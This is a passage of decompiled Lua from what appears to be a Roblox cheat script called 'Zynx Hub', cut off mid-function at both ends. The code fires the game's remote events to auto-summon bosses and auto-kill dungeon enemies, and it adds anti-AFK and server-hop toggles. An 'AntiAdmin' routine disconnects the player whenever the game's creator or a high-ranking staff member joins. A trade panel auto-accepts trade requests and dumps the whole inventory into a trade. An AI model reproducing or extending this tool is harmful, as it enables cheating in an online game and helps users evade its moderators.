                        end
                    end
                    break
                end
                iterationCursor3 = savedIterations2[3]
                iterationLimit2 = savedIterations2[2]
                iterationStep2 = savedIterations2[5]
                savedIterations = savedIterations2[1]
                return
            end
        end
    end, closureEnvironment)
end

function functions.handleWaitAtLine109(closureEnvironment, capturedOptions)
    return runtime.setEnvironment(function(...)
        local environment = runtime.getEnvironment()
        while true do
            environment.task.wait(3)
            if not ((not capturedOptions.AutoSummonMaiden) or not capturedOptions.AutoSummonMaiden.Value) then
                environment.pcall(functions.handleWaitForChild3(environment))
            end
            continue
        end
    end, closureEnvironment)
end

function functions.handleWaitForChild3(closureEnvironment)
    return runtime.setEnvironment(function(...)
        local environment = runtime.getEnvironment()
        local callResults, fireServer, gameValue, items, value, value2, value3
        items = runtime.create(2)
        runtime.move({ "BlessedMaidenBoss", environment._G.SelectedMaidenDifficulty }, 1, 2, 1, items)
        gameValue = environment.game
        value = (gameValue.GetService(gameValue, "ReplicatedStorage"))
        value2 = (value.WaitForChild(value, "Remotes"))
        value3 = (value2.WaitForChild(value2, "RequestSummonBoss"))
        fireServer = value3.FireServer
        callResults = runtime.pack(environment.unpack(items))
        fireServer(value3, runtime.unpack(callResults, 1, (((callResults.n + 4) - 1) - 3)))
        return
    end, closureEnvironment)
end

function functions.handleCallback30(closureEnvironment)
    return runtime.setEnvironment(function(...)
        local environment = runtime.getEnvironment()
        local antiAFK = ...
        local gValue
        gValue = environment._G
        gValue.AntiAFK = antiAFK
        return
    end, closureEnvironment)
end

function functions.callbackAtLine126(
    closureEnvironment,
    capturedOptions,
    capturedLocalPlayer2,
    capturedCallback13,
    capturedCallback8,
    capturedCallback15,
    capturedCallback14
)
    return runtime.setEnvironment(function(...)
        local environment = runtime.getEnvironment()
        while true do
            environment.task.wait(0.1)
            if
                not (
                    not capturedOptions.StartKillDungeon
                    or ((not capturedOptions.StartKillDungeon.Value) or environment._G.IsPortaling)
                )
            then
                environment.pcall(
                    functions.handleFindFirstChild9(
                        environment,
                        capturedLocalPlayer2,
                        capturedCallback13,
                        capturedCallback8,
                        capturedCallback15,
                        capturedCallback14
                    )
                )
            end
            continue
        end
    end, closureEnvironment)
end

function functions.handleFindFirstChild9(
    closureEnvironment,
    capturedLocalPlayer2,
    capturedCallback13,
    capturedCallback8,
    capturedCallback15,
    capturedCallback14
)
    return runtime.setEnvironment(function(...)
        local environment = runtime.getEnvironment()
        local callResults, callResults2, callResults3, callResults4, callResults5, callResults6, callResults7, callResults8, character, character2, enabled, enemies
        local find, hasNext, hasNext2, hasNext3, huge, items, items2, items3, iterationCursor, iterationCursor2, iterationCursor3, iterationCursor4
        local iterationLimit, iterationLimit2, iterationStep, iterationStep2, iteratorKey, iteratorKey2, iteratorKey3, iteratorValue, iteratorValue10, iteratorValue2, iteratorValue3, iteratorValue4
        local iteratorValue5, iteratorValue6, iteratorValue7, iteratorValue8, iteratorValue9, magnitude, mobs, nPCs, name, pairsValue, result, result2
        local result3, savedIterations, savedIterations2, savedIterations3, savedIterations4, workspaceValue, workspaceValue2, workspaceValue3, workspaceValue4, workspaceValue5
        iteratorValue = nil
        huge = environment.math.huge
        character = capturedLocalPlayer2.Character
        if character then
            character2 = capturedLocalPlayer2.Character
            character = character2.FindFirstChild(character2, "HumanoidRootPart")
        end
        if not character then
            return
        else
            items = runtime.create(26)
            runtime.move(
                {
                    "DungeonNPC",
                    "ShadowBoss",
                    "ShadowMonarchBoss",
                    "Shadow2",
                    "Shadow",
                    "Shadow1",
                    "Shadow3",
                    "Shadow4",
                    "Shadow5",
                    "Sukuna",
                    "GojoBoss",
                    "YujiBoss",
                    "RagnaBoss",
                    "AnosBoss",
                    "SaberBoss",
                    "StrongestinHistoryBoss",
                    "GilgameshBoss",
                    "AizenBoss",
                    "MadokaBoss",
                    "AlucardBoss",
                    "EscanorBoss",
                    "JinwooBoss",
                    "RimuruBoss",
                    "Ichigo",
                    "QinShiBoss",
                    "StrongestofTodayBoss",
                },
                1,
                26,
                1,
                items
            )
            items2 = runtime.create(4)
            workspaceValue = environment.workspace
            workspaceValue2 = environment.workspace
            enemies = workspaceValue2.FindFirstChild(workspaceValue2, "Enemies")
            workspaceValue3 = environment.workspace
            mobs = workspaceValue3.FindFirstChild(workspaceValue3, "Mobs")
            workspaceValue4 = environment.workspace
            nPCs = workspaceValue4.FindFirstChild(workspaceValue4, "NPCs")
            workspaceValue5 = environment.workspace
            callResults3 = runtime.pack(workspaceValue5.FindFirstChild(workspaceValue5, "Npcs"))
            items3 = items2
            runtime.move({ workspaceValue, enemies, mobs, nPCs }, 1, 4, 1, items3)
            runtime.move(callResults3, 1, (((callResults3.n + 10) - 1) - 9), 5, items3)
            callResults4 = runtime.pack(environment.pairs(items2))
            callResults5 = callResults4
            savedIterations4 = { nil, [5] = nil, nil, nil }
            result2 = runtime.wrapIterator(runtime.iteratorBody1)
            result2(callResults5[1], callResults5[2], callResults5[3])
            iteratorValue5 = nil
            iterationCursor3 = result2
            while true do
                hasNext, iteratorKey, iteratorValue4 = iterationCursor3()
                if not hasNext then
                else
                    iteratorValue5 = iteratorValue4
                end
                if hasNext then
                    if iteratorValue5 then
                        pairsValue = environment.pairs
                        iteratorValue10 = iteratorValue5
                        callResults6 = runtime.pack(iteratorValue10.GetChildren(iteratorValue10))
                        callResults7 = runtime.pack(
                            pairsValue(runtime.unpack(callResults6, 1, (((callResults6.n + 10) - 1) - 9)))
                        )
                        callResults8 = callResults7
                        savedIterations3 =
                            { savedIterations4, [5] = iterationStep2, iterationLimit, iterationCursor3 }
                        result3 = runtime.wrapIterator(runtime.iteratorBody1)
                        result3(callResults8[1], callResults8[2], callResults8[3])
                        iteratorValue8 = nil
                        iterationCursor2 = result3
                        while true do
                            hasNext2, iteratorKey2, iteratorValue7 = iterationCursor2()
                            if not hasNext2 then
                            else
                                iteratorValue8 = iteratorValue7
                            end
                            if hasNext2 then
                                enabled = false
                                callResults = runtime.pack(environment.ipairs(items))
                                callResults2 = callResults
                                savedIterations2 = {
                                    savedIterations3,
                                    [5] = iterationStep2,
                                    iterationLimit,
                                    iterationCursor2,
                                }
                                result = runtime.wrapIterator(runtime.iteratorBody1)
                                result(callResults2[1], callResults2[2], callResults2[3])
                                iteratorValue6 = nil
                                iterationCursor = result
                                while true do
                                    hasNext3, iteratorKey3, iteratorValue9 = iterationCursor()
                                    if not hasNext3 then
                                    else
                                        iteratorValue6 = iteratorValue9
                                    end
                                    if hasNext3 then
                                        if
                                            (iteratorValue8.Name ~= iteratorValue6)
                                            and not (
                                                environment.string.find(iteratorValue8.Name, iteratorValue6)
                                            )
                                        then
                                            continue
                                        else
                                            find = environment.string.find
                                            name = iteratorValue8.Name
                                            if not (find((name.lower(name)), "dummy")) then
                                                enabled = true
                                            else
                                                continue
                                            end
                                        end
                                    end
                                    break
                                end
                                iterationCursor2 = savedIterations2[3]
                                iterationLimit = savedIterations2[2]
                                iterationStep2 = savedIterations2[5]
                                savedIterations3 = savedIterations2[1]
                                if enabled then
                                    iteratorValue2 = iteratorValue8
                                    if
                                        not (
                                            not (iteratorValue2.FindFirstChild(iteratorValue2, "Humanoid"))
                                            or not (0 < iteratorValue8.Humanoid.Health)
                                        )
                                    then
                                        iteratorValue3 = iteratorValue8
                                        if
                                            iteratorValue3.FindFirstChild(iteratorValue3, "HumanoidRootPart")
                                        then
                                            magnitude = (
                                                (
                                                    character.Position
                                                    - iteratorValue8.HumanoidRootPart.Position
                                                )
                                            ).Magnitude
                                            if magnitude < huge then
                                                huge = magnitude
                                                iteratorValue = iteratorValue8
                                            end
                                        end
                                    end
                                end
                                continue
                            end
                            break
                        end
                        iterationCursor3 = savedIterations3[3]
                        iterationLimit = savedIterations3[2]
                        iterationStep2 = savedIterations3[5]
                        savedIterations4 = savedIterations3[1]
                    end
                    continue
                end
                break
            end
            iterationCursor4 = savedIterations4[3]
            iterationLimit2 = savedIterations4[2]
            iterationStep = savedIterations4[5]
            savedIterations = savedIterations4[1]
            if iteratorValue then
                capturedCallback8((capturedCallback13(iteratorValue.HumanoidRootPart)))
                if environment._G.SelectedWeaponGroup then
                    capturedCallback15(environment._G.SelectedWeaponGroup)
                end
                capturedCallback14()
            end
            return
        end
    end, closureEnvironment)
end

function functions.handleCallback31(closureEnvironment)
    return runtime.setEnvironment(function(...)
        local environment = runtime.getEnvironment()
        local autoServerHop = ...
        local gValue
        gValue = environment._G
        gValue.AutoServerHop = autoServerHop
        return
    end, closureEnvironment)
end

function functions.handleMatchAtLine1(closureEnvironment)
    return runtime.setEnvironment(function(...)
        local environment = runtime.getEnvironment()
        local argument1, argument2 = ...
        local argument22, callResults, callResults2, tonumberResult, tonumberResult2, tonumberValue, tonumberValue2
        argument22 = argument2
        tonumberValue = environment.tonumber
        callResults = runtime.pack(environment.string.match(argument1, "Lv%.%s*(%d+)"))
        tonumberResult = tonumberValue(runtime.unpack(callResults, 1, (((callResults.n + 4) - 1) - 3)))
        if not tonumberResult then
            tonumberResult = 0
        end
        tonumberValue2 = environment.tonumber
        callResults2 = runtime.pack(environment.string.match(argument22, "Lv%.%s*(%d+)"))
        tonumberResult2 = tonumberValue2(runtime.unpack(callResults2, 1, (((callResults2.n + 5) - 1) - 4)))
        if not tonumberResult2 then
            tonumberResult2 = 0
        end
        return (tonumberResult < tonumberResult2)
    end, closureEnvironment)
end

function functions.callback4(closureEnvironment, capturedBossState)
    return runtime.setEnvironment(function(...)
        local environment = runtime.getEnvironment()
        local argument1 = ...
        capturedBossState.value = argument1
        return
    end, closureEnvironment)
end

function functions.handleCallback32(closureEnvironment)
    return runtime.setEnvironment(function(...)
        local environment = runtime.getEnvironment()
        local moveMethod = ...
        local gValue
        gValue = environment._G
        gValue.MoveMethod = moveMethod
        return
    end, closureEnvironment)
end

function functions.handlePcall6(closureEnvironment)
    return runtime.setEnvironment(function(...)
        local environment = runtime.getEnvironment()
        local argument1 = ...
        local argument12
        argument12 = argument1
        if not environment._G.AntiAdmin then
            return
        else
            if argument12 == environment.game.Players.LocalPlayer then
                return
            else
                environment.pcall(functions.handleKick(environment, argument12))
                return
            end
        end
    end, closureEnvironment)
end

function functions.handleKick(closureEnvironment, capturedArgument12)
    return runtime.setEnvironment(function(...)
        local environment = runtime.getEnvironment()
        local enabled, localPlayer, value
        enabled = false
        if environment.game.CreatorType == environment.Enum.CreatorType.Group then
            value = capturedArgument12
            if 200 <= (value.GetRankInGroup(value, environment.game.CreatorId)) then
                enabled = true
            end
        else
            if capturedArgument12.UserId == environment.game.CreatorId then
                enabled = true
            end
        end
        if enabled then
            localPlayer = environment.game.Players.LocalPlayer
            localPlayer.Kick(localPlayer, "[ Zynx Hub ] Project Player")
        end
        return
    end, closureEnvironment)
end

function functions.handleCallback33(closureEnvironment)
    return runtime.setEnvironment(function(...)
        local environment = runtime.getEnvironment()
        local argument1 = ...
        local autoBossFarm, currentLockedBoss, gValue, gValue2, gValue3
        autoBossFarm = argument1
        gValue3 = environment._G
        gValue3.AutoBossFarm = autoBossFarm
        if not autoBossFarm then
            gValue = environment._G
            gValue.BossIsActive = false
            gValue2 = environment._G
            gValue2.CurrentLockedBoss = currentLockedBoss
        end
        return
    end, closureEnvironment)
end

function functions.callbackAtLine94(
    closureEnvironment,
    capturedCallback6,
    capturedItems44,
    capturedLocalPlayer2,
    capturedCallback8
)
    return runtime.setEnvironment(function(...)
        local environment = runtime.getEnvironment()
        local character
        if
            not (
                (
                    (
                        not environment._G.SelectIslandTP or (
                            capturedCallback6(environment._G.SelectIslandTP)
                        )
                    ) or not capturedItems44[environment._G.SelectIslandTP]
                ) or not capturedLocalPlayer2.Character
            )
        then
            character = capturedLocalPlayer2.Character
            if character.FindFirstChild(character, "HumanoidRootPart") then
                capturedCallback8(capturedItems44[environment._G.SelectIslandTP])
            end
        end
        return
    end, closureEnvironment)
end

function functions.handlePcall7(closureEnvironment)
    return runtime.setEnvironment(function(...)
        local environment = runtime.getEnvironment()
        local argument1 = ...
        environment.pcall(functions.handleGetServiceAtLine52(environment, argument1))
        return
    end, closureEnvironment)
end

function functions.handleGetServiceAtLine52(closureEnvironment, capturedArgument1)
    return runtime.setEnvironment(function(...)
        local environment = runtime.getEnvironment()
        local gameValue, value
        gameValue = environment.game
        value = (gameValue.GetService(gameValue, "RunService"))
        value.Set3dRenderingEnabled(value, not capturedArgument1)
        return
    end, closureEnvironment)
end

function functions.handleWaitForChildAtLine48(
    closureEnvironment,
    capturedAddToggleResult,
    capturedAddToggleResult2,
    capturedNumberValueState2,
    capturedAddToggleResult3,
    capturedAddToggleResult4,
    capturedItems31,
    capturedNumberValueState,
    capturedResult13
)
    return runtime.setEnvironment(function(...)
        local environment = runtime.getEnvironment()
        local addButton, addButton10, addButton2, addButton3, addButton4, addButton5, addButton6, addButton7, addButton8, addButton9, addDropdown, addDropdown2
        local addDropdownResult, addDropdownResult2, addItemToTrade, addParagraph, callback, callback2, cancelTrade, confirmTrade, gameValue, getTradablePlayers, items, items10
        local items11, items12, items13, items2, items3, items4, items5, items6, items7, items8, items9, onClientEvent
        local onClientEvent2, onClientEvent3, removeItemFromTrade, respondToRequest, result, result2, sendTradeRequest, setReady, trade, trade10, trade11, trade12
        local trade13, trade14, trade15, trade2, trade3, trade4, trade5, trade6, trade7, trade8, trade9, tradeRequestReceived
        local tradeStarted, tradeState, tradeUpdated, value, values2, values3, waitForChildResult, waitForChildResult10, waitForChildResult11, waitForChildResult12, waitForChildResult13, waitForChildResult14
        local waitForChildResult2, waitForChildResult3, waitForChildResult4, waitForChildResult5, waitForChildResult6, waitForChildResult7, waitForChildResult8, waitForChildResult9
        tradeState = {}
        gameValue = environment.game
        value = (gameValue.GetService(gameValue, "ReplicatedStorage"))
        waitForChildResult = value.WaitForChild(value, "Remotes", 10)
        if not waitForChildResult then
            return
        else
            waitForChildResult13 = waitForChildResult
            waitForChildResult14 = waitForChildResult13.WaitForChild(waitForChildResult13, "TradeRemotes", 10)
            if not waitForChildResult14 then
                return
            else
                waitForChildResult2 = waitForChildResult14
                sendTradeRequest = waitForChildResult2.WaitForChild(waitForChildResult2, "SendTradeRequest")
                waitForChildResult3 = waitForChildResult14
                respondToRequest = waitForChildResult3.WaitForChild(waitForChildResult3, "RespondToRequest")
                waitForChildResult4 = waitForChildResult14
                addItemToTrade = waitForChildResult4.WaitForChild(waitForChildResult4, "AddItemToTrade")
                waitForChildResult5 = waitForChildResult14
                removeItemFromTrade =
                    waitForChildResult5.WaitForChild(waitForChildResult5, "RemoveItemFromTrade")
                waitForChildResult6 = waitForChildResult14
                setReady = waitForChildResult6.WaitForChild(waitForChildResult6, "SetReady")
                waitForChildResult7 = waitForChildResult14
                cancelTrade = waitForChildResult7.WaitForChild(waitForChildResult7, "CancelTrade")
                waitForChildResult8 = waitForChildResult14
                confirmTrade = waitForChildResult8.WaitForChild(waitForChildResult8, "ConfirmTrade")
                waitForChildResult9 = waitForChildResult14
                getTradablePlayers =
                    waitForChildResult9.WaitForChild(waitForChildResult9, "GetTradablePlayers")
                waitForChildResult10 = waitForChildResult14
                tradeRequestReceived =
                    waitForChildResult10.WaitForChild(waitForChildResult10, "TradeRequestReceived")
                waitForChildResult11 = waitForChildResult14
                tradeStarted = waitForChildResult11.WaitForChild(waitForChildResult11, "TradeStarted")
                waitForChildResult12 = waitForChildResult14
                tradeUpdated = waitForChildResult12.WaitForChild(waitForChildResult12, "TradeUpdated")
                onClientEvent = tradeRequestReceived.OnClientEvent
                onClientEvent.Connect(
                    onClientEvent,
                    functions.handleWaitAtLine1(environment, capturedAddToggleResult, respondToRequest)
                )
                onClientEvent2 = tradeStarted.OnClientEvent
                onClientEvent2.Connect(
                    onClientEvent2,
                    functions.handleWaitAtLine2(
                        environment,
                        capturedAddToggleResult2,
                        capturedNumberValueState2,
                        addItemToTrade,
                        capturedAddToggleResult3,
                        setReady
                    )
                )
                onClientEvent3 = tradeUpdated.OnClientEvent
                onClientEvent3.Connect(
                    onClientEvent3,
                    functions.handleFireServer2(
                        environment,
                        capturedAddToggleResult3,
                        capturedNumberValueState2,
                        setReady,
                        capturedAddToggleResult4,
                        confirmTrade
                    )
                )
                trade = capturedItems31.Trade
                trade.AddSection(trade, "Manual Actions")
                callback = functions.handleIpairs(environment, getTradablePlayers)
                trade2 = capturedItems31.Trade
                addDropdown = trade2.AddDropdown
                tradeState.value = "Trade_PlayerDropdown"
                items = {}
                items.Title = "Select Player to Trade"
                values2 = callback()
                items.Values = values2
                items.Multi = false
                items.Default = 1
                addDropdownResult = addDropdown(trade2, tradeState.value, items)
                result = addDropdownResult
                tradeState.value = result
                result.OnChanged(
                    tradeState.value,
                    functions.handleTonumber(environment, capturedNumberValueState)
                )
                trade3 = capturedItems31.Trade
                tradeState.value = trade3
                addButton = trade3.AddButton
                items2 = {}
                items2.Title = "Refresh Player List"
                items2.Callback = functions.callbackAtLine11(environment, addDropdownResult, callback)
                addButton(tradeState.value, items2)
                trade4 = capturedItems31.Trade
                tradeState.value = trade4
                addButton2 = trade4.AddButton
                items3 = {}
                items3.Title = "Send Trade Request"
                items3.Callback = functions.callbackAtLine3220(
                    environment,
                    capturedNumberValueState,
                    sendTradeRequest,
                    capturedResult13
                )
                addButton2(tradeState.value, items3)
                trade5 = capturedItems31.Trade
                tradeState.value = trade5
                addParagraph = trade5.AddParagraph
                items4 = {}
                items4.Title = "Active Trade"
                items4.Content =
                    "จัดการสถานะการเทรดด้วยตัวเอง"
                addParagraph(tradeState.value, items4)
                trade6 = capturedItems31.Trade
                tradeState.value = trade6
                addButton3 = trade6.AddButton
                items5 = {}
                items5.Title = "Accept Request"
                items5.Callback = functions.callbackAtLine76(environment, respondToRequest)
                addButton3(tradeState.value, items5)
                trade7 = capturedItems31.Trade
                tradeState.value = trade7
                addButton4 = trade7.AddButton
                items6 = {}
                items6.Title = "Decline Request"
                items6.Callback = functions.callbackAtLine59(environment, respondToRequest)
                addButton4(tradeState.value, items6)
                trade8 = capturedItems31.Trade
                tradeState.value = trade8
                addButton5 = trade8.AddButton
                items7 = {}
                items7.Title = "Set Ready (พร้อม)"
                items7.Callback = functions.callbackAtLine3225(environment, setReady)
                addButton5(tradeState.value, items7)
                trade9 = capturedItems31.Trade
                tradeState.value = trade9
                addButton6 = trade9.AddButton
                items8 = {}
                items8.Title = "Confirm Trade (ยืนยัน)"
                items8.Callback = functions.callbackAtLine110(environment, confirmTrade)
                addButton6(tradeState.value, items8)
                trade10 = capturedItems31.Trade
                tradeState.value = trade10
                addButton7 = trade10.AddButton
                items9 = {}
                items9.Title = "Cancel Trade (ยกเลิก)"
                items9.Callback = functions.callbackAtLine3227(environment, cancelTrade)
                addButton7(tradeState.value, items9)
                trade11 = capturedItems31.Trade
                tradeState.value = trade11
                trade11.AddSection(tradeState.value, "Manage Items")
                trade12 = capturedItems31.Trade
                tradeState.value = trade12
                addButton8 = trade12.AddButton
                items10 = {}
                items10.Title = "Force Add ALL Items (ดูดของทั้งหมดทันที)"
                items10.Description =
                    "กดปุ่มนี้เพื่อยัดของทุกชิ้นลงช่องเทรดเดี๋ยวนี้ (จำกัด 25 ชิ้น)"
                items10.Callback = functions.callbackAtLine125(environment, addItemToTrade, capturedResult13)
                addButton8(tradeState.value, items10)
                callback2 = functions.handleInsert(environment)
                tradeState.value = {}
                trade13 = capturedItems31.Trade
                addDropdown2 = trade13.AddDropdown
                items11 = {}
                items11.Title = "Select Specific Items"
                values3 = callback2()
                items11.Values = values3
                items11.Multi = true
                items11.Default = {}
                addDropdownResult2 = addDropdown2(trade13, "Trade_MyItemsDropdown", items11)
                result2 = addDropdownResult2
                result2.OnChanged(result2, functions.handleCallback34(environment, tradeState))
                trade14 = capturedItems31.Trade
                addButton9 = trade14.AddButton
                items12 = {}
                items12.Title = "1. Refresh My Items (โหลดของ)"
                items12.Callback = functions.callbackAtLine3285(environment, addDropdownResult2, callback2)
                addButton9(trade14, items12)
                trade15 = capturedItems31.Trade
                addButton10 = trade15.AddButton
                items13 = {}
                items13.Title = "2. Add Selected Items (ดึงของที่เลือก)"
                items13.Callback =
                    functions.callback5(environment, tradeState, addItemToTrade, capturedResult13)
                addButton10(trade15, items13)
                return
            end
        end
    end, closureEnvironment)
end

function functions.handleTonumber(closureEnvironment, capturedNumberValueState)
    return runtime.setEnvironment(function(...)
        local environment = runtime.getEnvironment()
        local argument1 = ...
        local argument12, matchResult, tonumberResult, value
        argument12 = argument1
        if argument12 then
            value = (environment.tostring(argument12))
            matchResult = value.match(value, "%[(%d+)%]")
            if matchResult then
                tonumberResult = environment.tonumber(matchResult)
                capturedNumberValueState.value = tonumberResult
            end
        end
        return
    end, closureEnvironment)
end

function functions.callbackAtLine11(closureEnvironment, capturedAddDropdownResult, capturedCallback)
    return runtime.setEnvironment(function(...)
        local environment = runtime.getEnvironment()
        local callResults, setValues, value
        value = capturedAddDropdownResult
        setValues = value.SetValues
        callResults = runtime.pack(capturedCallback())
        setValues(value, runtime.unpack(callResults, 1, (((callResults.n + 3) - 1) - 2)))
        return
    end, closureEnvironment)
end

function functions.callbackAtLine3220(
    closureEnvironment,
    capturedNumberValueState,
    capturedSendTradeRequest,
    capturedResult13
)
    return runtime.setEnvironment(function(...)
        local environment = runtime.getEnvironment()
        local items, notify, value, value2
        if capturedNumberValueState.value then
            value = capturedSendTradeRequest
            value.FireServer(value, capturedNumberValueState.value)
            value2 = capturedResult13
            notify = value2.Notify
            items = {}
            items.Title = "Trade"
            items.Content = "Request Sent!"
            items.Duration = 3
            notify(value2, items)
        end
        return
    end, closureEnvironment)
end

function functions.callbackAtLine125(closureEnvironment, capturedAddItemToTrade, capturedResult13)
    return runtime.setEnvironment(function(...)
        local environment = runtime.getEnvironment()
        local content, items, items2, localPlayer, notify, notify2, numberValueState, playerGui, value, value2
        numberValueState = {}
        localPlayer = environment.game.Players.LocalPlayer
        numberValueState.value = localPlayer
        playerGui = localPlayer.FindFirstChild(numberValueState.value, "PlayerGui")
        numberValueState.value = 0
        environment.pcall(
            functions.handleGetAttributeAtLine87(
                environment,
                playerGui,
                capturedAddItemToTrade,
                numberValueState
            )
        )
        if not (0 < numberValueState.value) then
            value = capturedResult13
            notify = value.Notify
            items = {}
            items.Title = "Warning"
            items.Content =
                "ไม่พบไอเทม! (อย่าลืมกดเปิดกระเป๋าในหน้าเทรดของเกมก่อน 1 ครั้งเพื่อให้ของโหลด)"
            items.Duration = 5
            notify(value, items)
        else
            value2 = capturedResult13
            notify2 = value2.Notify
            items2 = {}
            items2.Title = "Trade"
            content = (
                "ยัดของสำเร็จ " .. (numberValueState.value .. " รายการ")
            )
            items2.Content = content
            items2.Duration = 3
            notify2(value2, items2)
        end
        return
    end, closureEnvironment)
end

function functions.handleGetAttributeAtLine87(
    closureEnvironment,
    capturedPlayerGui,
    capturedAddItemToTrade,
    capturedNumberValueState
)
    return runtime.setEnvironment(function(...)
        local environment = runtime.getEnvironment()
        local callResults, callResults2, callResults3, category, hasNext, inventory, inventory2, ipairsValue, iterationCursor, iterationCursor2, iterationLimit, iterationStep
        local iteratorKey, iteratorValue, iteratorValue2, iteratorValue3, iteratorValue4, iteratorValue5, maxQuantity, name, numberValue, result, savedIterations, savedIterations2
        local value
        inventory =
            capturedPlayerGui.InTradingUI.MainFrame.Frame.Content.Player1Side.Player1Holder.PopupHolder.InventoryPopup.Content.Inventory
        ipairsValue = environment.ipairs
        inventory2 = inventory
        callResults = runtime.pack(inventory2.GetChildren(inventory2))
        callResults2 =
            runtime.pack(ipairsValue(runtime.unpack(callResults, 1, (((callResults.n + 3) - 1) - 2))))
        callResults3 = callResults2
        savedIterations2 = { nil, [5] = nil, nil, nil }
        result = runtime.wrapIterator(runtime.iteratorBody1)
        result(callResults3[1], callResults3[2], callResults3[3])
        iteratorValue5 = nil
        iterationCursor2 = result
        while true do
            hasNext, iteratorKey, iteratorValue4 = iterationCursor2()
            if not hasNext then
            else
                iteratorValue5 = iteratorValue4
            end
            if hasNext then
                iteratorValue3 = iteratorValue5
                if not (iteratorValue3.IsA(iteratorValue3, "ImageButton")) then
                    continue
                else
                    iteratorValue = iteratorValue5
                    category = iteratorValue.GetAttribute(iteratorValue, "Category")
                    iteratorValue2 = iteratorValue5
                    maxQuantity = iteratorValue2.GetAttribute(iteratorValue2, "MaxQuantity")
                    name = iteratorValue5.Name
                    if ((not category) or not name) or not maxQuantity then
                        continue
                    else
                        value = capturedAddItemToTrade
                        value.FireServer(value, category, name, maxQuantity)
                        numberValue = (capturedNumberValueState.value + 1)
                        capturedNumberValueState.value = numberValue
                        environment.task.wait(0.05)
                        if not (9999 <= capturedNumberValueState.value) then
                            continue
                        end
                    end
                end
            end
            break
        end
        iterationCursor = savedIterations2[3]
        iterationLimit = savedIterations2[2]
        iterationStep = savedIterations2[5]
        savedIterations = savedIterations2[1]
        return
    end, closureEnvironment)
end

function functions.callbackAtLine59(closureEnvironment, capturedRespondToRequest)
    return runtime.setEnvironment(function(...)
        local environment = runtime.getEnvironment()
        local value
        value = capturedRespondToRequest
        value.FireServer(value, false)
        return
    end, closureEnvironment)
end

function functions.handleWaitAtLine1(closureEnvironment, capturedAddToggleResult, capturedRespondToRequest)
    return runtime.setEnvironment(function(...)
        local environment = runtime.getEnvironment()
        local value
        if capturedAddToggleResult.Value then
            environment.task.wait(0.5)
            value = capturedRespondToRequest
            value.FireServer(value, true)
        end
        return
    end, closureEnvironment)
end

function functions.callback5(closureEnvironment, capturedTradeState, capturedAddItemToTrade, capturedResult13)
    return runtime.setEnvironment(function(...)
        local environment = runtime.getEnvironment()
        local callback, localPlayer
        localPlayer = environment.game.Players.LocalPlayer
        callback = functions.handleGetAttributeAtLine37(
            environment,
            (localPlayer.FindFirstChild(localPlayer, "PlayerGui")),
            capturedTradeState,
            capturedAddItemToTrade,
            capturedResult13
        )
        environment.pcall(callback)
        return
    end, closureEnvironment)
end

function functions.handleGetAttributeAtLine37(
    closureEnvironment,
    capturedSharedValue,
    capturedTradeState,
    capturedAddItemToTrade,
    capturedResult13
)
    return runtime.setEnvironment(function(...)
        local environment = runtime.getEnvironment()
        local callResults, callResults2, callResults3, category, content, hasNext, inventory, inventory2, ipairsValue, items, iterationCursor, iterationCursor2
        local iterationLimit, iterationStep, iteratorKey, iteratorValue, iteratorValue2, iteratorValue3, iteratorValue4, iteratorValue5, maxQuantity, notify, numberValue, result
        local savedIterations, savedIterations2, value, value2
        inventory =
            capturedSharedValue.InTradingUI.MainFrame.Frame.Content.Player1Side.Player1Holder.PopupHolder.InventoryPopup.Content.Inventory
        numberValue = 0
        ipairsValue = environment.ipairs
        inventory2 = inventory
        callResults = runtime.pack(inventory2.GetChildren(inventory2))
        callResults2 =
            runtime.pack(ipairsValue(runtime.unpack(callResults, 1, (((callResults.n + 4) - 1) - 3))))
        callResults3 = callResults2
        savedIterations = { nil, [5] = nil, nil, nil }
        result = runtime.wrapIterator(runtime.iteratorBody1)
        result(callResults3[1], callResults3[2], callResults3[3])
        iteratorValue3 = nil
        iterationCursor = result
        while true do
            hasNext, iteratorKey, iteratorValue5 = iterationCursor()
            if not hasNext then
            else
                iteratorValue3 = iteratorValue5
            end
            if hasNext then
                iteratorValue4 = iteratorValue3
                if
                    not (iteratorValue4.IsA(iteratorValue4, "ImageButton"))
                    or not capturedTradeState.value[iteratorValue3.Name]
                then
                    continue
                else
                    iteratorValue = iteratorValue3
                    category = iteratorValue.GetAttribute(iteratorValue, "Category")
                    iteratorValue2 = iteratorValue3
                    maxQuantity = iteratorValue2.GetAttribute(iteratorValue2, "MaxQuantity")
                    if (not category) or not maxQuantity then
                        continue
                    else
                        value2 = capturedAddItemToTrade
                        value2.FireServer(value2, category, iteratorValue3.Name, maxQuantity)
                        numberValue = (numberValue + 1)
                        environment.task.wait(0.05)
                        if not (25 <= numberValue) then
                            continue
                        end
                    end
                end
            end
            break
        end
        iterationCursor2 = savedIterations[3]
        iterationLimit = savedIterations[2]
        iterationStep = savedIterations[5]
        savedIterations2 = savedIterations[1]
        value = capturedResult13
        notify = value.Notify
        items = {}
        items.Title = "Trade"
        content = ("Added " .. (numberValue .. " items."))
        items.Content = content
        items.Duration = 3
        notify(value, items)
        return
    end, closureEnvironment)
end

function functions.callbackAtLine3285(closureEnvironment, capturedAddDropdownResult2, capturedCallback2)
    return runtime.setEnvironment(function(...)
        local environment = runtime.getEnvironment()
        local callResults, setValues, value
        value = capturedAddDropdownResult2
        setValues = value.SetValues
        callResults = runtime.pack(capturedCallback2())
        setValues(value, runtime.unpack(callResults, 1, (((callResults.n + 3) - 1) - 2)))
        return
    end, closureEnvironment)
end

function functions.callbackAtLine3227(closureEnvironment, capturedCancelTrade)
    return runtime.setEnvironment(function(...)
        local environment = runtime.getEnvironment()
        local value
        value = capturedCancelTrade
        value.FireServer(value)
        return
    end, closureEnvironment)
end

function functions.handleIpairs(closureEnvironment, capturedGetTradablePlayers)
    return runtime.setEnvironment(function(...)
        local environment = runtime.getEnvironment()
        local callResults, callResults2, callResults3, callResults4, displayName, hasNext, insert, item, items, items2, iterationCursor, iterationCursor2
        local iterationLimit, iterationStep, iteratorKey, iteratorValue, iteratorValue2, result, savedIterations, savedIterations2
        items2 = {}
        callResults3 = runtime.pack(
            environment.pcall(functions.handleInvokeServer(environment, capturedGetTradablePlayers))
        )
        callResults4 = callResults3
        item = callResults4[2]
        if not ((not callResults4[1]) or ((environment["type"](item)) ~= "table")) then
            callResults = runtime.pack(environment.ipairs(item))
            callResults2 = callResults
            savedIterations = { nil, [5] = nil, nil, nil }
            result = runtime.wrapIterator(runtime.iteratorBody1)
            result(callResults2[1], callResults2[2], callResults2[3])
            iteratorValue = nil
            iterationCursor = result
            while true do
                hasNext, iteratorKey, iteratorValue2 = iterationCursor()
                if not hasNext then
                else
